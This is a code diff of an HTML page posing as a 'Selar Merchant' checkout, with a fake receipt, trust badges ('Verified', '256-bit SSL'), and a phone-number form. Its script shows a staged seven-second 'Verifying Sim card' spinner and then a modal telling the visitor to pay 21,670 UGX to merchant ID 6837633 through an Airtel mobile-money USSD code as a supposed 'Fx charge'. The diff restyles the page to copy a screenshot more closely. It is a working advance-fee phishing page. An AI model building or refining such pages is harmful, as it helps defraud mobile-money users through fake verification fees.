@@ -7,251 +7,270 @@
     <style>
         :root {
             --selar-purple: #5a1a5a;
-            --success-green: #28a745;
+            --success-green: #00a651;
             --error-red: #d9534f;
-            --airtel-red: #ff0000;
+            --text-gray: #777;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f0f2f5;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #ffffff;
             display: flex;
             justify-content: center;
-            padding: 20px;
             margin: 0;
+            padding: 10px;
         }
 
-        .checkout-wrapper {
+        .main-container {
             width: 100%;
             max-width: 400px;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            padding: 20px;
             text-align: center;
         }
 
-        /* UI Elements */
-        .brand-logo {
-            background: var(--selar-purple);
+        /* Top Badge */
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            border: 1px solid #e0e0e0;
+            border-radius: 20px;
+            padding: 4px 15px;
+            font-size: 12px;
+            font-weight: bold;
+            margin: 10px 0;
+            color: #333;
+        }
+        .dot { color: #2ecc71; margin-right: 6px; font-size: 18px; }
+
+        /* Branding */
+        .logo-circle {
+            background-color: var(--selar-purple);
             color: white;
-            width: 60px;
-            height: 60px;
+            width: 75px;
+            height: 75px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 10px auto;
+            font-size: 24px;
             font-weight: bold;
+            margin: 15px auto;
         }
 
-        .receipt-card {
-            background: #fafafa;
-            border: 1px dashed #ccc;
-            padding: 15px;
-            text-align: left;
-            font-family: monospace;
-            margin: 20px 0;
+        .main-title { font-size: 20px; font-weight: 900; margin-bottom: 5px; }
+        .verified-tag { color: #2ecc71; font-size: 16px; margin-bottom: 15px; }
+
+        .btn-row { margin-bottom: 20px; }
+        .chip {
+            background: #f2f2f2;
+            border-radius: 10px;
+            padding: 6px 15px;
             font-size: 13px;
+            color: #555;
+            text-decoration: none;
+            margin: 0 4px;
         }
 
-        .input-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        input[type="text"] {
-            flex: 1;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            outline: none;
-        }
-
-        .btn-continue {
-            background: #00a651;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        /* LOADING OVERLAY */
-        #loadingOverlay {
-            display: none; /* Hidden by default */
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: white;
-            z-index: 9999;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-
-        .spinner {
-            width: 50px; height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid var(--selar-purple);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        .sub-text {
+            font-size: 12px;
+            color: #888;
+            line-height: 1.4;
+            padding: 0 20px;
             margin-bottom: 20px;
         }
 
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* MODAL */
-        #instructionModal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 10000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background: white;
-            width: 90%;
-            max-width: 360px;
-            border-radius: 20px;
-            overflow: hidden;
-            animation: pop 0.3s ease-out;
-        }
-
-        @keyframes pop { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-
-        .modal-header {
-            background: var(--selar-purple);
-            color: white;
+        /* The Exact Receipt Look */
+        .receipt-box {
+            border: 1px solid #ddd;
             padding: 20px;
+            background: #fff;
+            background-image: radial-gradient(#d0d0d0 0.5px, transparent 0.5px);
+            background-size: 6px 6px; /* Dot pattern like screenshot */
+            text-align: left;
+            font-family: 'Courier New', Courier, monospace;
+            margin-bottom: 20px;
         }
 
-        .airtel-logo-text {
-            background: white;
-            color: var(--airtel-red);
-            padding: 5px 15px;
-            border-radius: 50px;
-            display: inline-block;
-            margin-top: 10px;
-            font-weight: 800;
+        .receipt-header { text-align: center; font-weight: bold; font-size: 15px; margin-bottom: 5px; }
+        .receipt-row { display: flex; justify-content: space-between; margin: 4px 0; font-size: 13px; }
+        .receipt-row span:first-child { color: #333; font-weight: bold; }
+        
+        .total-label { margin-top: 15px; font-size: 12px; font-weight: bold; }
+        .total-val { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
+
+        .red-alert-box {
+            border: 1px solid var(--error-red);
+            color: var(--error-red);
+            padding: 10px;
+            font-size: 11px;
+            text-align: center;
+            font-weight: bold;
+            margin: 15px 0;
+            background: rgba(255,0,0,0.02);
         }
 
-        .flag-blink { animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.1; } }
+        /* Payment Form */
+        .payment-card {
+            border: 1px solid #eee;
+            border-radius: 25px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            text-align: left;
+        }
 
-        .modal-body { padding: 20px; text-align: left; font-size: 15px; }
-        .step { margin-bottom: 12px; display: flex; align-items: center; }
-        .icon { margin-right: 10px; font-size: 20px; }
-
-        .btn-ok {
-            width: 100%;
-            padding: 15px;
-            background: #00a651;
+        .input-flex { display: flex; gap: 10px; margin-bottom: 15px; }
+        input[type="text"] {
+            flex: 1;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 12px;
+            font-size: 20px;
+            color: #333;
+        }
+        .btn-continue {
+            background-color: var(--success-green);
             color: white;
             border: none;
+            border-radius: 10px;
+            padding: 0 20px;
             font-weight: bold;
             font-size: 16px;
             cursor: pointer;
         }
+
+        .network-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #666; }
+        .sim-status { text-align: center; font-style: italic; font-size: 10px; color: #999; margin-top: 10px; }
+
+        .note-footer { color: var(--error-red); font-size: 10px; font-weight: bold; margin: 25px 0; line-height: 1.4; }
+
+        /* LOADING & MODAL LOGIC (Hidden initially) */
+        #loadingOverlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 1000; flex-direction: column; justify-content: center; align-items: center;
+        }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--selar-purple); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        #instructionModal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 2000; justify-content: center; align-items: center;
+        }
+        .modal-content { background: white; width: 90%; max-width: 350px; border-radius: 20px; overflow: hidden; animation: slideIn 0.3s; }
+        @keyframes slideIn { from { transform: translateY(20px); } }
+        .modal-head { background: var(--selar-purple); color: white; padding: 20px; text-align: center; }
+        .modal-body { padding: 20px; font-size: 14px; }
+        .flag-blink { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .btn-ok { width: 100%; padding: 15px; background: var(--success-green); color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; }
+
     </style>
 </head>
 <body>
 
-<div class="checkout-wrapper">
-    <div class="brand-logo">Selar</div>
-    <h3>selar-Merchant-200usd-743,000UGX</h3>
-    <p style="color: green;">✔ Verified</p>
-
-    <div class="receipt-header-main">SELAR MERCHANT TRANSACTION</div>
-        <div class="receipt-center" style="font-size: 11px; margin-bottom: 10px;">TRANSACTION - RECEIPT</div>
-        <div class="receipt-center" style="margin-bottom: 10px;">****************************</div>
-        <div class="receipt-line"><strong>TYPE:</strong> Send Money (Mobile)</div>
-        <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Selar Merchant Account Number]</div>
-        <div class="receipt-line"><strong>NAME:</strong> Lolikishee USA Chicago🇺🇲</div>
-        <div class="receipt-line" style="margin-top: 15px;"><strong>RECIPIENT ID:</strong> SI001234595</div>
-        <div class="receipt-bold" style="text-decoration: underline;">Mobile Transaction </div>
-        <div class="receipt-line"><strong>MOBILE:</strong>6837633</div>
-        <div class="receipt-line"><strong>NETWORK:</strong> MERCHANT ID</div>
-        <div class="receipt-line" style="margin-top: 15px;"><strong>TOTAL AMOUNT:</strong></div>
-        <div class="receipt-bold" style="font-size: 18px;">USD 200.00</div>
-        <div class="receipt-center" style="margin-top: 15px;">----------------------------</div>
-        <div class="red-status">[SIM CARD NOT REGISTERED ON SELAR MERCHANT TRANSACTION SYSTEM]</div>
-        <div class="receipt-center" style="font-family: sans-serif; font-size: 24px; margin-top: 20px; font-weight: 900; letter-spacing: 4px;">SELAR MERCHANT</div>
-    </div>
-
-    <div class="input-group">
-        <input type="text" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10">
-        <button type="button" class="btn-continue" id="submitBtn">Continue</button>
-    </div>
+<div class="main-container">
+    <div class="status-badge"><span class="dot">●</span> SELAR MERCHANT PAYMENT 🇺🇬</div>
     
-    <p style="font-size: 11px; color: var(--error-red);">Only Verified Sim Cards Supported</p>
+    <div class="logo-circle">Selar</div>
+    <div class="main-title">selar-Merchant-200usd-74,300UGX</div>
+    <div class="verified-tag">✔ Verified</div>
+
+    <div class="btn-row">
+        <span class="chip">@selara4</span>
+        <span class="chip">📋 Copy paylink</span>
+    </div>
+
+    <p class="sub-text">You are paying fx charge for selar-merchant-200usd securely. Payments are protected and your details stay private.</p>
+
+    <div class="receipt-box">
+        <div class="receipt-header">SELAR MERCHANT TRANSACTION</div>
+        <div style="text-align: center; margin-bottom: 10px;">TRANSACTION - RECEIPT</div>
+        <div style="text-align: center; letter-spacing: 2px; margin-bottom: 10px;">****************************</div>
+        
+        <div class="receipt-row"><span>TYPE:</span> <span>Send Money (Mobile)</span></div>
+        <div class="receipt-row"><span>ACCOUNT:</span> <span>[Your Selar Merchant Account Number]</span></div>
+        <div class="receipt-row"><span>NAME:</span> <span>Lolikishee USA Chicago 🇺🇸</span></div>
+        <div class="receipt-row"><span>RECIPIENT ID:</span> <span>SI001234595</span></div>
+        
+        <div style="text-decoration: underline; font-weight: bold; margin: 15px 0 5px;">Mobile Transaction</div>
+        <div class="receipt-row"><span>MOBILE:</span> <span>6837633</span></div>
+        <div class="receipt-row"><span>NETWORK:</span> <span>MERCHANT ID</span></div>
+
+        <div class="total-label">TOTAL AMOUNT:</div>
+        <div class="total-val">USD 200.00</div>
+        
+        <div style="text-align: center; letter-spacing: 2px; color: #ccc;">----------------------------</div>
+
+        <div class="red-alert-box">
+            [ SIM CARD NOT REGISTERED ON SELAR MERCHANT TRANSACTION SYSTEM ]
+        </div>
+
+        <div style="text-align: center; font-size: 22px; font-weight: 900; letter-spacing: 2px; margin-top: 10px;">
+            SELAR MERCHANT
+        </div>
+    </div>
+
+    <div class="payment-card">
+        <div class="input-flex">
+            <input type="text" id="phoneNum" placeholder="07XXXXXXXX" maxlength="10">
+            <button type="button" class="btn-continue" onclick="process()">Continue</button>
+        </div>
+        <div class="network-row">
+            <span>Amount: UGX 21,670</span>
+            <span><b style="color:#f1c40f">MTN</b> ● <b style="color:#e74c3c">airtel</b></span>
+        </div>
+        <div class="sim-status">
+            PERSON VERIFIED<br>
+            SIM CARD NOT VERIFIED
+        </div>
+    </div>
+
+    <p class="note-footer">
+        NOTE: Currently Selar merchant system support transactions on Sim Card Verified by Selar Merchant.
+    </p>
+
+    <div style="display:flex; justify-content: space-between; font-size: 10px; color: #aaa; margin-top: 10px;">
+        <span>© 2026 Selar Merchant system</span>
+        <span>256-bit SSL ● Secure</span>
+    </div>
 </div>
 
 <div id="loadingOverlay">
     <div class="spinner"></div>
-    <h3 id="dynamicLoadingText" style="padding: 0 30px;"></h3>
-    <p>Processing verification...</p>
+    <h3 id="loadText" style="padding: 0 40px; text-align: center; font-size: 18px;"></h3>
 </div>
 
 <div id="instructionModal">
     <div class="modal-content">
-        <div class="modal-header">
+        <div class="modal-head">
             <strong>SELAR MERCHANT TRANSACTION</strong><br>
-            <div class="airtel-logo-text">
+            <div style="background:white; color:#e74c3c; display:inline-block; padding:2px 10px; border-radius:5px; margin-top:10px; font-weight:bold;">
                 AIRTEL <span class="flag-blink">🇺🇬</span>
             </div>
         </div>
         <div class="modal-body">
             <p><strong>How to pay Fx charge:</strong></p>
-            <div class="step"><span class="icon">📞</span> Dial: <strong>*185*9#</strong></div>
-            <div class="step"><span class="icon">🆔</span> Merchant ID: <strong>6837633</strong></div>
-            <div class="step"><span class="icon">💵</span> Amount: <strong>21670</strong></div>
-            <div class="step"><span class="icon">🔖</span> Ref: <strong>selar merchant</strong></div>
-            <hr>
-            <p style="font-size: 12px; color: #666;">Confirm payment on your phone to verify your SIM.</p>
+            <p>📞 <strong>Dial: *185*9#</strong></p>
+            <p>🆔 Enter Merchant ID: <strong>6837633</strong></p>
+            <p>💵 Enter Amount: <strong>21670</strong></p>
+            <p>🔖 Reference: <strong>selar merchant</strong></p>
+            <p style="font-size:12px; border-top:1px solid #eee; pt:10px; mt:10px;">Confirm payment to verify your SIM card.</p>
         </div>
-        <button class="btn-ok" id="closeBtn">Okay, I have understood</button>
+        <button class="btn-ok" onclick="document.getElementById('instructionModal').style.display='none'">Okay, I have understood</button>
     </div>
 </div>
 
 <script>
-    const submitBtn = document.getElementById('submitBtn');
-    const phoneInput = document.getElementById('phoneInput');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    const dynamicLoadingText = document.getElementById('dynamicLoadingText');
-    const instructionModal = document.getElementById('instructionModal');
-    const closeBtn = document.getElementById('closeBtn');
-
-    submitBtn.addEventListener('click', function() {
-        const number = phoneInput.value;
-
-        if(number.length < 10) {
-            alert("Please enter a valid 10-digit number");
-            return;
-        }
-
-        // 1. Set the text
-        dynamicLoadingText.innerText = `Verifying Sim card ${number} for merchant transaction of 200$~743,000UGX`;
-
-        // 2. Show loading screen
-        loadingOverlay.style.display = 'flex';
-
-        // 3. Start 7 second timer
-        setTimeout(function() {
-            loadingOverlay.style.display = 'none'; // Hide loading
-            instructionModal.style.display = 'flex'; // Show modal
+    function process() {
+        const val = document.getElementById('phoneNum').value;
+        if(val.length < 10) return alert("Enter valid number");
+        
+        document.getElementById('loadText').innerText = `Verifying Sim card ${val} for merchant transaction of 200$~743,000UGX`;
+        document.getElementById('loadingOverlay').style.display = 'flex';
+        
+        setTimeout(() => {
+            document.getElementById('loadingOverlay').style.display = 'none';
+            document.getElementById('instructionModal').style.display = 'flex';
         }, 7000);
-    });
-
-    closeBtn.addEventListener('click', function() {
-        instructionModal.style.display = 'none';
-    });
+    }
 </script>
 
 </body>
